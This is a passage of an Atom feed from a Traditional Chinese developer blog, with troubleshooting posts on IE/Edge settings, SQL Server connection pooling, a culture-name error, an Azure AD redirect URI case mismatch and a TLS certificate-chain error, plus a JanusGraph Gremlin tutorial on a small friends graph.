      <category term="Kali Linux" scheme="https://rainmakerho.github.io/tags/Kali-Linux/"/>
    
      <category term="WSL" scheme="https://rainmakerho.github.io/tags/WSL/"/>
    
      <category term="Kex" scheme="https://rainmakerho.github.io/tags/Kex/"/>
    
  </entry>
  
  <entry>
    <title>為什麼開啟 IE 時，會被關掉，並改用 Edge 呢?</title>
    <link href="https://rainmakerho.github.io/2022/06/08/why-ie-always-open-edge/"/>
    <id>https://rainmakerho.github.io/2022/06/08/why-ie-always-open-edge/</id>
    <published>2022-06-08T05:28:18.000Z</published>
    <updated>2022-06-08T05:59:13.365Z</updated>
    
    <content type="html"><![CDATA[<h3 id="問題"><a href="#問題" class="headerlink" title="問題"></a>問題</h3><p>在 Windows 10 開啟 Internet Explorer 時，會被關掉，並開啟 Edge，如下，<br><img src="/2022/06/08/why-ie-always-open-edge/01.gif" title="ie2edge"></p><h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><p>這是因為 Edge 的設定中，在 <strong>Internet Explorer 相容性</strong> 區段，<br><strong>在 Microsoft Edge 中以 Internet Explorer 開啟網站</strong> 選項被設定成了 <strong>永遠</strong>。<br>所以只要一開 Internet Explorer 就會立馬關掉它，並改用 Edge (InPrivate 模式除外)。</p><p>那要如何取消這個設定呢?<br>在 Edge 的網址列輸入 <code>edge://settings/defaultBrowser</code>，<br>將 <strong>在 Microsoft Edge 中以 Internet Explorer 開啟網站</strong> 的選項改成 <strong>永不</strong> 就可以了。<br>如果要在 Edge 中以 IE 模式開啟，則可以在 <strong>Internet Explorer 模式頁面</strong>新增要使用 IE 模式開啟的網站。</p><img src="/2022/06/08/why-ie-always-open-edge/02.png" title="Internet Explorer 相容性"><p>如果要長久性設定 IE 模式，則可以透過 Group Policy 設定，<br>詳細請參考 <a href="https://www.tbone.se/2022/03/01/start-disable-internet-explorer-before-its-to-late/" target="_blank" rel="noopener">Start disable Internet Explorer before it´s to late</a></p><h3 id="參考資料"><a href="#參考資料" class="headerlink" title="參考資料"></a>參考資料</h3><p><a href="https://www.tbone.se/2022/03/01/start-disable-internet-explorer-before-its-to-late/" target="_blank" rel="noopener">Start disable Internet Explorer before it´s to late</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;問題&quot;&gt;&lt;a href=&quot;#問題&quot; class=&quot;headerlink&quot; title=&quot;問題&quot;&gt;&lt;/a&gt;問題&lt;/h3&gt;&lt;p&gt;在 Windows 10 開啟 Internet Explorer 時，會被關掉，並開啟 Edge，如下，&lt;br&gt;&lt;img src=&quot;/20
      
    
    </summary>
    
    
      <category term="Win10" scheme="https://rainmakerho.github.io/tags/Win10/"/>
    
      <category term="IE11" scheme="https://rainmakerho.github.io/tags/IE11/"/>
    
      <category term="Windows 10" scheme="https://rainmakerho.github.io/tags/Windows-10/"/>
    
      <category term="Internet Explorer" scheme="https://rainmakerho.github.io/tags/Internet-Explorer/"/>
    
      <category term="Edge" scheme="https://rainmakerho.github.io/tags/Edge/"/>
    
  </entry>
  
  <entry>
    <title>(0x80131904) Named Pipes Provider, error 40 - 無法開啟至 SQL Server 的連接</title>
    <link href="https://rainmakerho.github.io/2022/05/22/sqlexception-80131904-error-40/"/>
    <id>https://rainmakerho.github.io/2022/05/22/sqlexception-80131904-error-40/</id>
    <published>2022-05-22T08:45:40.000Z</published>
    <updated>2022-05-22T09:06:38.551Z</updated>
    
    <content type="html"><![CDATA[<h3 id="問題"><a href="#問題" class="headerlink" title="問題"></a>問題</h3><p>有個系統最近不定期會發生 <strong>System.Data.SqIClient.SqlException (0x80131904)</strong> 的錯誤，已持續一個月，詳細錯誤如下，</p><blockquote><p>System.Data.SqIClient.SqlException (0x80131904):建立連接至 SQL Server 時,發生網路相關或執行個體特定的錯誤。找不到或無法存取伺服器。确認執行個名稱是否正確,以及SQL Srver 是否設定為允許遠端連線。<br>(provider: Named Pipes Provider, error: 40 - 無法開啟至 SQL Server 的連接) –&gt;<br>System.ComponentModel.Win32Exception(0x80004005):找不到網路路徑</p></blockquote><h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><p>問題狀況如下，</p><ul><li>錯誤不定時間發生</li><li>錯誤不在特定的程式</li><li>查看 DB 那些時間點，也沒有做什麼 備份，或是 ReBuild Index 的 Job</li><li>DB連線字串使用的是 ip ，但錯誤卻是 <strong>Named Pipes Provider, error: 40</strong></li></ul><p>DB連線字串並沒有特別設定 Max Pool 的大小，所以預設是 100 個。<br>判斷有可能是 Pool 滿了，所以發生了錯誤。<br>請同事依 <a href="https://dotblogs.azurewebsites.net/rainmaker/2017/04/26/143316" target="_blank" rel="noopener">已超過連接逾時的設定。在取得集區連接之前超過逾時等待的時間，可能的原因為所有的共用連接已在使用中，並已達共用集區大小的最大值。</a> 這篇查看一下目前 AP 所佔的 Pool 量是多少，<br>結果居然接近 100 ，所以就請同事在 DB連線字串中，加入 <strong>Max Pool Size</strong> ，並設定成 200 。</p><p>最近觀察2個星期已沒在發生以上的錯誤了。</p><h3 id="參考資源"><a href="#參考資源" class="headerlink" title="參考資源"></a>參考資源</h3><p><a href="https://www.huanlintalk.com/2012/05/net-connection-pool.html" target="_blank" rel="noopener">.NET Connection Pool 與連線相關問題整理</a><br><a href="https://docs.microsoft.com/en-us/dotnet/api/system.data.sqlclient.sqlconnection.connectionstring?view=netframework-4.8" target="_blank" rel="noopener">SqlConnection.ConnectionString Property</a><br><a href="https://dotblogs.azurewebsites.net/rainmaker/2017/04/26/143316" target="_blank" rel="noopener">已超過連接逾時的設定。在取得集區連接之前超過逾時等待的時間，可能的原因為所有的共用連接已在使用中，並已達共用集區大小的最大值。</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;問題&quot;&gt;&lt;a href=&quot;#問題&quot; class=&quot;headerlink&quot; title=&quot;問題&quot;&gt;&lt;/a&gt;問題&lt;/h3&gt;&lt;p&gt;有個系統最近不定期會發生 &lt;strong&gt;System.Data.SqIClient.SqlException (0x80131904)&lt;/
      
    
    </summary>
    
    
      <category term="SqlException (0x80131904)" scheme="https://rainmakerho.github.io/tags/SqlException-0x80131904/"/>
    
      <category term="Named Pipes Provider" scheme="https://rainmakerho.github.io/tags/Named-Pipes-Provider/"/>
    
      <category term="Win32Exception(0x80004005)" scheme="https://rainmakerho.github.io/tags/Win32Exception-0x80004005/"/>
    
  </entry>
  
  <entry>
    <title>不支援文化特性名稱 zh-TW_pronun。</title>
    <link href="https://rainmakerho.github.io/2022/05/19/CultureNotFoundException-zh-TW-pronun-not-supported/"/>
    <id>https://rainmakerho.github.io/2022/05/19/CultureNotFoundException-zh-TW-pronun-not-supported/</id>
    <published>2022-05-19T05:41:23.000Z</published>
    <updated>2022-05-19T06:02:13.293Z</updated>
    
    <content type="html"><![CDATA[<h3 id="問題"><a href="#問題" class="headerlink" title="問題"></a>問題</h3><p>最近同事拿到新的 NB 設定完成後，連到舊的 ASP.NET 系統，<br>結果網頁卻發生了 <strong>不支援文化特性名稱 zh-TW_pronun。參數名稱: name</strong> 的錯誤，</p><blockquote><p>System.Globalization.CultureInfo..ctor  &lt;System.ArgumentException&gt; 不支援文化特性名稱 zh-TW_pronun。參數名稱: name  </p></blockquote><h3 id="研究與解決"><a href="#研究與解決" class="headerlink" title="研究與解決"></a>研究與解決</h3><p>看見 <strong>不支援文化特性名稱</strong> 立馬就請他參考 <a href="https://rainmakerho.github.io/2019/09/17/2019024/">Windows 10, IE 不支援文化特性。參數名稱：name zh-Hant-TW 是無效的文化特性識別項。</a> 。<br>但詳細一看，雖然錯誤是一樣的，但 CultureName 卻是不同的，<br>一個是 <strong>zh-Hant-TW</strong> ，而這個卻是 <strong>zh-TW_pronun</strong>。</p><p>查詢 <strong>zh-TW_pronun</strong> ，看到 <a href="https://docs.microsoft.com/en-us/windows/win32/intl/sort-order-identifiers" target="_blank" rel="noopener">Sort Order Identifiers</a> 發現它跟 排序 有關係。<br>又查到 <a href="https://answers.microsoft.com/zh-hant/windows/forum/all/%E8%AE%8A%E6%9B%B4%E5%9C%B0%E5%8D%80%E6%8E%92/458d3c6a-8592-4720-97d9-004daae0eed6" target="_blank" rel="noopener">變更地區排序方法為注音，開始工具列右下角月曆無法顯示</a> 。</p><p>所以請同事檢查一下，將排序的設定值，從 <strong>注音</strong> 改回 <strong>筆劃數</strong> IE 就可以正常使用 Web 系統了。<br><img src="/2022/05/19/CultureNotFoundException-zh-TW-pronun-not-supported/01.png" title="變更排序方法"></p><ul><li>註: Windows 10 預設是 <strong>筆劃數</strong> </li></ul><h3 id="參考資源"><a href="#參考資源" class="headerlink" title="參考資源"></a>參考資源</h3><p><a href="https://rainmakerho.github.io/2019/09/17/2019024/">Windows 10, IE 不支援文化特性。參數名稱：name zh-Hant-TW 是無效的文化特性識別項。</a><br><a href="https://answers.microsoft.com/zh-hant/windows/forum/all/%E8%AE%8A%E6%9B%B4%E5%9C%B0%E5%8D%80%E6%8E%92/458d3c6a-8592-4720-97d9-004daae0eed6" target="_blank" rel="noopener">變更地區排序方法為注音，開始工具列右下角月曆無法顯示</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;問題&quot;&gt;&lt;a href=&quot;#問題&quot; class=&quot;headerlink&quot; title=&quot;問題&quot;&gt;&lt;/a&gt;問題&lt;/h3&gt;&lt;p&gt;最近同事拿到新的 NB 設定完成後，連到舊的 ASP.NET 系統，&lt;br&gt;結果網頁卻發生了 &lt;strong&gt;不支援文化特性名稱 zh-TW
      
    
    </summary>
    
    
      <category term="zh-Hant-TW" scheme="https://rainmakerho.github.io/tags/zh-Hant-TW/"/>
    
      <category term="zh-TW_pronun" scheme="https://rainmakerho.github.io/tags/zh-TW-pronun/"/>
    
      <category term="CultureNotFoundException" scheme="https://rainmakerho.github.io/tags/CultureNotFoundException/"/>
    
      <category term="Culture name zh-TW_pronun is not supported" scheme="https://rainmakerho.github.io/tags/Culture-name-zh-TW-pronun-is-not-supported/"/>
    
      <category term="不支援文化特性名稱 zh-TW_pronun" scheme="https://rainmakerho.github.io/tags/%E4%B8%8D%E6%94%AF%E6%8F%B4%E6%96%87%E5%8C%96%E7%89%B9%E6%80%A7%E5%90%8D%E7%A8%B1-zh-TW-pronun/"/>
    
      <category term="Windows 10" scheme="https://rainmakerho.github.io/tags/Windows-10/"/>
    
      <category term="變更排序方法" scheme="https://rainmakerho.github.io/tags/%E8%AE%8A%E6%9B%B4%E6%8E%92%E5%BA%8F%E6%96%B9%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>AADSTS50011 The redirect URI &#39;https://.../licensemanagement/signin-azuread-oidc&#39; specified in the request does not match the redirect URIs configured for the application &#39;appid&#39;</title>
    <link href="https://rainmakerho.github.io/2022/05/11/AADSTS50011/"/>
    <id>https://rainmakerho.github.io/2022/05/11/AADSTS50011/</id>
    <published>2022-05-11T07:41:58.000Z</published>
    <updated>2022-05-11T08:20:37.136Z</updated>
    
    <content type="html"><![CDATA[<h3 id="問題"><a href="#問題" class="headerlink" title="問題"></a>問題</h3><p>最近一個系統整合 Azure AD 登入，不定時會出現 <strong>AADSTS50011: The redirect URI</strong> 的錯誤</p><blockquote><p>抱歉，我們無法將您登入。<br>AADSTS50011: The redirect URI ‘https://…/licensemanagement/signin-azuread-oidc’ specified in the request does not match the redirect URIs configured for the application ‘5000xxxx-xxxx-xxxx-b9cf-1dxxxx1dxxxx’. Make sure the redirect URI sent in the request matches one added to your application in the Azure portal. Navigate to <a href="https://aka.ms/redirectUriMismatchError" target="_blank" rel="noopener">https://aka.ms/redirectUriMismatchError</a> to learn more about how to fix this. More details: Reply address did not match because of case sensitivity.</p></blockquote><img src="/2022/05/11/AADSTS50011/01.png" title="AADSTS50011"><h3 id="解決"><a href="#解決" class="headerlink" title="解決"></a>解決</h3><p>看錯誤訊息中所顯示的 URI 跟 Azure AD 的 App registrations 中該 AP 的 Authentication 功能中，<br>Redirect URIs 裡面設定的是一樣的!</p><p>因為同事 HiHi 測試會錯誤，而我測試則正確，結果同事將它的 URL 傳給我，<br>並詢問我該 URL 是否正確。<br>我點下該 URL 登入，居然也出現 <strong>AADSTS50011</strong> 的錯誤。<br>而我另開 Browser 自行輸入 URL 登入，居然又沒問題了。<br>於是我將 2 個 URL 比較了一下，終於發現問題。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://.../licensemanagement</span><br><span class="line">https://.../Licensemanagement</span><br></pre></td></tr></table></figure><p>不知眼尖的朋友有沒有發現問題所在?<br>沒錯，就是<strong>大小寫</strong>的問題。</p><p>因為我在 Azure AD 中設定的是 <code>Licensemanagement</code> ，<br>而錯誤的 URL 卻是 <code>licensemanagement</code> 。</p><p>後來將全小寫的 URL 也新增到 Azure AD 該 App 的 Redirect URIs 之中就沒問題了。</p><ul><li>註: 感謝同事 HiHi Paul 一起幫忙找出問題 ^_^</li></ul><h3 id="參考資源"><a href="#參考資源" class="headerlink" title="參考資源"></a>參考資源</h3><p><a href="https://docs.microsoft.com/en-us/troubleshoot/azure/active-directory/error-code-aadsts50011-reply-url-mismatch" target="_blank" rel="noopener">Error AADSTS50011 - The reply URL ‘reply URL sent’ specified in the request does not match the reply URLs configured for the application ‘appId’</a><br><a href="https://docs.abp.io/zh-Hans/abp/latest/How-To/Azure-Active-Directory-Authentication-MVC" target="_blank" rel="noopener">如何对MVC / Razor页面应用程序使用Azure Active Directory身份验证</a><br><a href="https://stackoverflow.com/questions/56447508/can-i-turn-off-case-sensitivity-for-azure-ad-redirecturi" target="_blank" rel="noopener">Can I turn off case sensitivity for Azure AD RedirectURI</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;問題&quot;&gt;&lt;a href=&quot;#問題&quot; class=&quot;headerlink&quot; title=&quot;問題&quot;&gt;&lt;/a&gt;問題&lt;/h3&gt;&lt;p&gt;最近一個系統整合 Azure AD 登入，不定時會出現 &lt;strong&gt;AADSTS50011: The redirect URI&lt;/str
      
    
    </summary>
    
    
      <category term="AADSTS50011" scheme="https://rainmakerho.github.io/tags/AADSTS50011/"/>
    
      <category term="Azure" scheme="https://rainmakerho.github.io/tags/Azure/"/>
    
      <category term="Azure AD" scheme="https://rainmakerho.github.io/tags/Azure-AD/"/>
    
      <category term="signin-azuread-oidc" scheme="https://rainmakerho.github.io/tags/signin-azuread-oidc/"/>
    
      <category term="Redirect URIs" scheme="https://rainmakerho.github.io/tags/Redirect-URIs/"/>
    
      <category term="case sensitivity" scheme="https://rainmakerho.github.io/tags/case-sensitivity/"/>
    
  </entry>
  
  <entry>
    <title>JanusGraph 學習 - 以朋友關係為例</title>
    <link href="https://rainmakerho.github.io/2022/05/10/gremlin-friends-examples/"/>
    <id>https://rainmakerho.github.io/2022/05/10/gremlin-friends-examples/</id>
    <published>2022-05-10T02:25:48.000Z</published>
    <updated>2022-05-10T05:59:44.884Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>學習最好的方式就是練習，以下使用 person-&gt;friends-&gt;person 的朋友關係資料來練習。</p><ol><li>Dave 的朋友是那些人?</li><li>Dave 的朋友的朋友是那些人?</li><li>Ted 要如何關連到 Denise ?</li></ol><h3 id="環境準備"><a href="#環境準備" class="headerlink" title="環境準備"></a>環境準備</h3><p>使用 Docker 最方便，所以第一次透過 <code>docker run</code> 將 JanusGraph 下載下來並執行<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --rm --name janusgraph-default docker.io/janusgraph/janusgraph:latest</span><br></pre></td></tr></table></figure></p><img src="/2022/05/10/gremlin-friends-examples/01.png" title="docker run"><p>如果要停止 janusgraph ，可執行 <code>docker stop janusgraph-default</code><br>要再執行 janusgraph ，可執行 <code>docker start janusgraph-default</code><br><img src="/2022/05/10/gremlin-friends-examples/02.png" title="docker stop/start"></p><p>當 JanusGraph 執行起來後，開啟 Gremlin Console<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it janusgraph-default ./bin/gremlin.sh</span><br></pre></td></tr></table></figure></p><img src="/2022/05/10/gremlin-friends-examples/03.png" title="docker exec -it"><p>連到 JanusGraph 的 Gremlin Server，並將 Gremlin Console 切換到 Remote<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">:remote connect tinkerpop.server conf/remote.yaml session</span><br><span class="line"></span><br><span class="line">:remote console</span><br></pre></td></tr></table></figure></p><img src="/2022/05/10/gremlin-friends-examples/04.png" title="gremlin console"><h3 id="新增資料"><a href="#新增資料" class="headerlink" title="新增資料"></a>新增資料</h3><p>在 Gremlin Console 中，貼上以下的 groovy 程式，以新增朋友的資料<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Remove any existing data to allow this to be rerun</span></span><br><span class="line">g.V().drop().iterate()</span><br><span class="line"></span><br><span class="line"><span class="comment">//Adds a person vertex with a name of Dave and saves it to a variable</span></span><br><span class="line">dave = g.addV(<span class="string">'person'</span>).property(<span class="string">'first_name'</span>, <span class="string">'Dave'</span>).next()</span><br><span class="line"><span class="comment">//Adds a person vertex with a name of Josh and saves it to a variable</span></span><br><span class="line">josh = g.addV(<span class="string">'person'</span>).property(<span class="string">'first_name'</span>, <span class="string">'Josh'</span>).next()</span><br><span class="line"><span class="comment">//Adds a person vertex with a name of Ted and saves it to a variable</span></span><br><span class="line">ted = g.addV(<span class="string">'person'</span>).property(<span class="string">'first_name'</span>, <span class="string">'Ted'</span>).next()</span><br><span class="line"><span class="comment">//Adds a person vertex with a name of Hank and saves it to a variable</span></span><br><span class="line">hank = g.addV(<span class="string">'person'</span>).property(<span class="string">'first_name'</span>, <span class="string">'Hank'</span>).next()</span><br><span class="line"></span><br><span class="line"><span class="comment">//Adds a friends edge between Dave and Ted</span></span><br><span class="line">g.addE(<span class="string">'friends'</span>).from(dave).to(ted).next()</span><br><span class="line"><span class="comment">//Adds a friends edge between Dave and Josh</span></span><br><span class="line">g.addE(<span class="string">'friends'</span>).from(dave).to(josh).next()</span><br><span class="line"><span class="comment">//Adds a friends edge between Dave and Hank</span></span><br><span class="line">g.addE(<span class="string">'friends'</span>).from(dave).to(hank).next()</span><br><span class="line"><span class="comment">//Adds a friends edge between Josh and Hank</span></span><br><span class="line">g.addE(<span class="string">'friends'</span>).from(josh).to(hank).next()</span><br><span class="line"><span class="comment">//Adds a friends edge between Ted and Josh</span></span><br><span class="line">g.addE(<span class="string">'friends'</span>).from(ted).to(josh).next()</span><br><span class="line"></span><br><span class="line"><span class="comment">//Adds a person vertex with a name of Kelly and saves it to a variable</span></span><br><span class="line">kelly = g.addV(<span class="string">'person'</span>).property(<span class="string">'first_name'</span>, <span class="string">'Kelly'</span>).next()</span><br><span class="line"><span class="comment">//Adds a person vertex with a name of Jim and saves it to a variable</span></span><br><span class="line">jim = g.addV(<span class="string">'person'</span>).property(<span class="string">'first_name'</span>, <span class="string">'Jim'</span>).next()</span><br><span class="line"><span class="comment">//Adds a person vertex with a name of Paras and saves it to a variable</span></span><br><span class="line">paras = g.addV(<span class="string">'person'</span>).property(<span class="string">'first_name'</span>, <span class="string">'Paras'</span>).next()</span><br><span class="line"><span class="comment">//Adds a person vertex with a name of Denise and saves it to a variable</span></span><br><span class="line">denise = g.addV(<span class="string">'person'</span>).property(<span class="string">'first_name'</span>, <span class="string">'Denise'</span>).next()</span><br><span class="line"></span><br><span class="line"><span class="comment">//Adds friends edges</span></span><br><span class="line">g.addE(<span class="string">'friends'</span>).from(dave).to(jim).</span><br><span class="line">        addE(<span class="string">'friends'</span>).from(dave).to(kelly).</span><br><span class="line">        addE(<span class="string">'friends'</span>).from(kelly).to(jim).</span><br><span class="line">        addE(<span class="string">'friends'</span>).from(kelly).to(denise).</span><br><span class="line">        addE(<span class="string">'friends'</span>).from(jim).to(denise).</span><br><span class="line">        addE(<span class="string">'friends'</span>).from(jim).to(paras).</span><br><span class="line">        addE(<span class="string">'friends'</span>).from(paras).to(denise).iterate()</span><br></pre></td></tr></table></figure></p><ul><li>註: 以上資料來自 <a href="https://www.ituring.com.cn/book/2889" target="_blank" rel="noopener">图数据库实战</a> 的《图数据库实战》源代码文件.zip</li></ul><h3 id="練習問題"><a href="#練習問題" class="headerlink" title="練習問題"></a>練習問題</h3><h4 id="Dave-的朋友是那些人"><a href="#Dave-的朋友是那些人" class="headerlink" title="Dave 的朋友是那些人?"></a>Dave 的朋友是那些人?</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g.V().has(&apos;person&apos;, &apos;first_name&apos;, &apos;Dave&apos;).outE(&apos;friends&apos;).inV().values(&apos;first_name&apos;)</span><br></pre></td></tr></table></figure><ul><li>註:<code>outE(&#39;friends&#39;) + inV()</code> 可以改用 <code>out(&#39;friends&#39;)</code>，所以 gremlin 可以改成<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g.V().has(<span class="string">'person'</span>, <span class="string">'first_name'</span>, <span class="string">'Dave'</span>).out(<span class="string">'friends'</span>).values(<span class="string">'first_name'</span>)</span><br></pre></td></tr></table></figure></li></ul><img src="/2022/05/10/gremlin-friends-examples/05.png" title="找朋友"><h4 id="Dave-的朋友的朋友是那些人"><a href="#Dave-的朋友的朋友是那些人" class="headerlink" title="Dave 的朋友的朋友是那些人?"></a>Dave 的朋友的朋友是那些人?</h4><p>朋友的朋友，就是找朋友 <strong>2</strong> 次，所以可以用 <code>times(2)</code><br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">g.V().has(<span class="string">'person'</span>, <span class="string">'first_name'</span>, <span class="string">'Dave'</span>).</span><br><span class="line">repeat(</span><br><span class="line">  out(<span class="string">'friends'</span>)</span><br><span class="line">).times(<span class="number">2</span>).values(<span class="string">'first_name'</span>)</span><br></pre></td></tr></table></figure></p><ul><li>註: 因為有重覆的人，可以使用 <code>dedup()</code> 去除重覆資料 Denise 就只會顯示一筆<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">g.V().has(<span class="string">'person'</span>, <span class="string">'first_name'</span>, <span class="string">'Dave'</span>).</span><br><span class="line">repeat(</span><br><span class="line">  out(<span class="string">'friends'</span>)</span><br><span class="line">).times(<span class="number">2</span>).</span><br><span class="line">dedup().</span><br><span class="line">values(<span class="string">'first_name'</span>)</span><br></pre></td></tr></table></figure></li></ul><img src="/2022/05/10/gremlin-friends-examples/06.png" title="找朋友的朋友"><h4 id="Ted-要如何關連到-Denise"><a href="#Ted-要如何關連到-Denise" class="headerlink" title="Ted 要如何關連到 Denise ?"></a>Ted 要如何關連到 Denise ?</h4><p>所以從 Ted <code>until</code> 到 Denise ，然後 <code>repeat</code> 來取出路徑，再顯示出 first_name<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">g.V().has(<span class="string">'person'</span>, <span class="string">'first_name'</span>, <span class="string">'Ted'</span>).</span><br><span class="line">until(has(<span class="string">'person'</span>, <span class="string">'first_name'</span>, <span class="string">'Denise'</span>)).</span><br><span class="line">repeat(</span><br><span class="line">both(<span class="string">'friends'</span>).simplePath()</span><br><span class="line">).path().by(values(<span class="string">'first_name'</span>))</span><br></pre></td></tr></table></figure></p><img src="/2022/05/10/gremlin-friends-examples/07.png" title="Ted 要如何關連到 Denise"><ul><li>註: GraphDatabase 的查詢通常是從 Vertex(Node) 開始，從 Edge 開始通常會有效能問題</li></ul><h3 id="參考資料"><a href="#參考資料" class="headerlink" title="參考資料"></a>參考資料</h3><p><a href="tactsunny.medium.com/out-vs-oute-janusgraph-and-gremlin-e19cebb9556e">out() vs. outE() — JanusGraph and Gremlin</a><br><a href="https://www.ituring.com.cn/book/2889" target="_blank" rel="noopener">图数据库实战</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;學習最好的方式就是練習，以下使用 person-&amp;gt;friends-&amp;gt;person 的朋友關係資料來練習。&lt;/p&gt;
&lt;ol&gt;
&lt;l
      
    
    </summary>
    
    
      <category term="GraphDatabase" scheme="https://rainmakerho.github.io/tags/GraphDatabase/"/>
    
      <category term="JanusGraph" scheme="https://rainmakerho.github.io/tags/JanusGraph/"/>
    
      <category term="Gremlin" scheme="https://rainmakerho.github.io/tags/Gremlin/"/>
    
      <category term="person" scheme="https://rainmakerho.github.io/tags/person/"/>
    
      <category term="friends" scheme="https://rainmakerho.github.io/tags/friends/"/>
    
      <category term="path()" scheme="https://rainmakerho.github.io/tags/path/"/>
    
  </entry>
  
  <entry>
    <title>System.Security.Authentication.AuthenticationException - The remote certificate is invalid because of errors in the certificate chain - PartialChain</title>
    <link href="https://rainmakerho.github.io/2022/05/04/openidconnecthandler-getuserinformationasync-tls-error/"/>
    <id>https://rainmakerho.github.io/2022/05/04/openidconnecthandler-getuserinformationasync-tls-error/</id>
    <published>2022-05-04T07:15:31.000Z</published>
    <updated>2022-05-04T07:58:20.792Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>我們有個 Web App 部署到正式環境，透過 Azure AD 登入後，<br>程式會轉到 Web App 的 <strong>/signin-azuread-oidc</strong> 然後它會轉址到錯誤頁面，<br>錯誤的Log如下，</p><blockquote><p>[ERR] Exception occurred while processing message.<br>System.Net.Http.HttpRequestException: The SSL connection could not be established, see inner exception.<br> —&gt; System.Security.Authentication.AuthenticationException: The remote certificate is invalid because of errors in the certificate chain: PartialChain<br>   at System.Net.Security.SslStream.SendAuthResetSignal(ProtocolToken message, ExceptionDispatchInfo exception)<br>   at System.Net.Security.SslStream.ForceAuthenticationAsync[TIOAdapter](TIOAdapter adapter, Boolean receiveFirst, Byte[] reAuthenticationData, Boolean isApm)<br>   at System.Net.Http.ConnectHelper.EstablishSslConnectionAsyncCore(Boolean async, Stream stream, SslClientAuthenticationOptions sslOptions, CancellationToken cancellationToken)<br>   — End of inner exception stack trace —<br>   at System.Net.Http.ConnectHelper.EstablishSslConnectionAsyncCore(Boolean async, Stream stream, SslClientAuthenticationOptions sslOptions, CancellationToken cancellationToken)<br>   at System.Net.Http.HttpConnectionPool.ConnectAsync(HttpRequestMessage request, Boolean async, CancellationToken cancellationToken)<br>   at System.Net.Http.HttpConnectionPool.CreateHttp11ConnectionAsync(HttpRequestMessage request, Boolean async, CancellationToken cancellationToken)<br>   at System.Net.Http.HttpConnectionPool.GetHttpConnectionAsync(HttpRequestMessage request, Boolean async, CancellationToken cancellationToken)<br>   at System.Net.Http.HttpConnectionPool.SendWithRetryAsync(HttpRequestMessage request, Boolean async, Boolean doRequestAuth, CancellationToken cancellationToken)<br>   at System.Net.Http.RedirectHandler.SendAsync(HttpRequestMessage request, Boolean async, CancellationToken cancellationToken)<br>   at System.Net.Http.DiagnosticsHandler.SendAsyncCore(HttpRequestMessage request, Boolean async, CancellationToken cancellationToken)<br>   at System.Net.Http.HttpClient.SendAsyncCore(HttpRequestMessage request, HttpCompletionOption completionOption, Boolean async, Boolean emitTelemetryStartStop, CancellationToken cancellationToken)<br>   at Microsoft.AspNetCore.Authentication.OpenIdConnect.OpenIdConnectHandler.GetUserInformationAsync(OpenIdConnectMessage message, JwtSecurityToken jwt, ClaimsPrincipal principal, AuthenticationProperties properties)<br>   at Microsoft.AspNetCore.Authentication.OpenIdConnect.OpenIdConnectHandler.HandleRemoteAuthenticateAsync()</p></blockquote><h3 id="解決"><a href="#解決" class="headerlink" title="解決"></a>解決</h3><p>因為不知道到 <strong>login.microsoftonline.com</strong> 登入後，<br><code>POST webap/signin-azuread-oidc</code> 後會發生錯誤，<br>從 Log 並不知道錯誤的 URL 是那一個，<br>所以請同事透過 VS.NET 並開啟 Fiddler 錄看看，<br>結果同事在 Fiddler 中發現它還會連到 <strong><a href="https://graph.microsoft.com" target="_blank" rel="noopener">https://graph.microsoft.com</a></strong>，<br>而在正式機開啟 Browser 連到 <strong><a href="https://graph.microsoft.com" target="_blank" 